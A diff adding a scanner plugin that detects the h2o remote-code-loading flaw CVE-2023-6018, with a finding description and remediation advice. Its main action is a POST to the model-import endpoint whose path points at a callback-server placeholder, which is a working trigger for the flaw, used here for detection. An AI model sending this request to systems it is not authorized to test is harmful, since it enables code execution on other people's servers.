@@ -1,0 +1,79 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "H2o_CVE_2023_6018"
+  author: "Marius Steffens (mariussteffens@google.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2023-6018"
+  }
+  severity: CRITICAL
+  title: "CVE-2023-6018"
+  description: "An attacker can use the model upload functionality to load remote Java code and gains code execution on the server hosting the h2o application."
+  recommendation: "There is no patch available as this is considered intended functionality. Restrict access to h2o to be local only, and do not expose it to the network."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-6018"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: POST
+    uri: "/3/ModelBuilders/generic"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    data: "model_id=irrelevant&path={{ T_CBS_URI }}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "model_id" },
+          { body: {} contains: "Import MOJO Model" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
